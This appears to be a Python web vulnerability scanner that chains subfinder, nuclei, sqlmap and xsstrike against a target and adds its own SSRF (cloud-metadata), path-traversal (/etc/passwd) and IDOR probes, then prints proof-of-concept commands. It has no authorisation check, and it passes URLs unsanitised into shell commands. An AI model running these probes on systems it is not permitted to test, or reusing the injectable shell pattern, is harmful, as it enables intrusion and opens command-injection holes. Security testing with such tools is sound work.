import argparse
import os
import subprocess
import requests
import json
import time
import signal
import sys

from urllib.parse import urlparse, parse_qs, urlsplit, urlunsplit, urlencode
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
import pyfiglet

console = Console()

# --- Graceful Exit Handler ---
def signal_handler(sig, frame):
    console.print("\n[bold red][-] Scan interrupted by user. Exiting...[/bold red]")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# --- Helper Functions ---
def banner():
    ascii_banner = pyfiglet.figlet_format("VulnScanner Pro")
    console.print(f"[bold red]{ascii_banner}[/bold red]")


def extract_domain(url):
    parsed = urlparse(url)
    return parsed.netloc


def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        return result.stdout.decode()
    except Exception as e:
        return str(e)


def generate_poc(url, vuln_type):
    if vuln_type == "ssrf":
        return f"curl '{url}' --proxy http://127.0.0.1:8080"
    elif vuln_type == "lfi":
        return f"curl '{url}?file=../../../../etc/passwd'"
    elif vuln_type == "idor":
        return f"curl '{url.replace('user=1', 'user=2')}'"
    elif vuln_type == "sql":
        return f"sqlmap -u '{url}' --batch"
    elif vuln_type == "xss":
        return f"<script>alert('XSS')</script> injected in form/input"
    else:
        return "No PoC available."


def scan_subdomains(domain):
    console.print("[cyan][*] Enumerating Subdomains...[/cyan]")
    result = run_command(f"subfinder -d {domain} -silent")
    subdomains = list(set(result.splitlines()))
    console.print(f"[green][+] Found {len(subdomains)} subdomains.[/green]")
    return subdomains


def scan_urls(url):
    console.print("[cyan][*] Crawling URLs using BeautifulSoup...[/cyan]")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set([urljoin(url, a['href']) for a in soup.find_all('a', href=True)])
        console.print(f"[green][+] Found {len(links)} URLs.[/green]")
        return links
    except Exception as e:
        console.print(f"[red][-] Failed to crawl URLs: {e}[/red]")
        return []


def run_nuclei_scan(urls):
    console.print("[cyan][*] Running nuclei scans...[/cyan]")
    with open("temp_urls.txt", "w") as f:
        f.write("\n".join(urls))
    run_command("nuclei -l temp_urls.txt -o nuclei_output.txt")
    with open("nuclei_output.txt", "r") as f:
        results = f.read()
    return results


def run_sqlmap_scan(url):
    return run_command(f"sqlmap -u {url} --batch --level=3 --risk=2 --random-agent --crawl=3")


def run_xss_scan(url):
    return run_command(f"xsstrike -u {url} --crawl --silent")


def test_ssrf(url):
    payloads = ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data"]
    for payload in payloads:
        test_url = inject_payload(url, payload)
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code == 200 and ("root" in r.text or "meta-data" in r.text):
                return True, test_url
        except:
            continue
    return False, None


def test_lfi(url):
    payload = "../../../../etc/passwd"
    test_url = inject_payload(url, payload)
    try:
        r = requests.get(test_url, timeout=5)
        if "root:x:" in r.text:
            return True, test_url
    except:
        pass
    return False, None


def test_idor(url):
    parsed = urlsplit(url)
    query = parse_qs(parsed.query)
    for key, values in query.items():
        if any(v.isdigit() for v in values):
            modified = query.copy()
            modified[key] = [str(int(values[0]) + 1)]
            new_query = urlencode(modified, doseq=True)
            new_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))
            try:
                r1 = requests.get(url, timeout=5)
                r2 = requests.get(new_url, timeout=5)
                if r1.text != r2.text:
                    return True, new_url
            except:
                continue
    return False, None


def inject_payload(url, payload):
    parsed = urlsplit(url)
    query = parse_qs(parsed.query)
    for key in query:
        query[key] = [payload]
    new_query = urlencode(query, doseq=True)
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))


def main():
    banner()

    parser = argparse.ArgumentParser(description="Advanced Website Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. https://example.com)")
    args = parser.parse_args()

    domain = extract_domain(args.url)
    subdomains = scan_subdomains(domain)
    urls = scan_urls(args.url)
    all_urls = list(urls) + [f"https://{sub}" for sub in subdomains]

    findings = []
    nuclei_results = run_nuclei_scan(all_urls)
    console.print("\n[bold yellow][+] Nuclei Scan Results:[/bold yellow]")
    console.print(nuclei_results)

    with Progress() as progress:
        task = progress.add_task("[green]Scanning URLs...", total=len(all_urls))

        for url in all_urls:
            console.print(f"\n[blue][~] Scanning:[/blue] {url}")

            sql_results = run_sqlmap_scan(url)
            if "sql injection" in sql_results.lower():
                findings.append(("SQL Injection", url, generate_poc(url, "sql")))

            xss_results = run_xss_scan(url)
            if "xss" in xss_results.lower():
                findings.append(("XSS", url, generate_poc(url, "xss")))

            ssrf_found, ssrf_url = test_ssrf(url)
            if ssrf_found:
                findings.append(("SSRF", ssrf_url, generate_poc(ssrf_url, "ssrf")))

            lfi_found, lfi_url = test_lfi(url)
            if lfi_found:
                findings.append(("LFI", lfi_url, generate_poc(lfi_url, "lfi")))

            idor_found, idor_url = test_idor(url)
            if idor_found:
                findings.append(("IDOR", idor_url, generate_poc(idor_url, "idor")))

            progress.update(task, advance=1)

    if findings:
        table = Table(title="[bold red]Vulnerabilities Found[/bold red]")
        table.add_column("Type", style="cyan")
        table.add_column("URL", style="magenta")
        table.add_column("PoC", style="green")

        for vuln_type, url, poc in findings:
            table.add_row(vuln_type, url, poc)

        console.print(table)
    else:
        console.print("[green][+] No vulnerabilities found.[/green]")

    with open("vulnscan_report.json", "w") as f:
        json.dump([{"type": t, "url": u, "poc": p} for t, u, p in findings], f, indent=2)
        console.print("[blue][+] Report saved as vulnscan_report.json[/blue]")


if __name__ == '__main__':
    main()
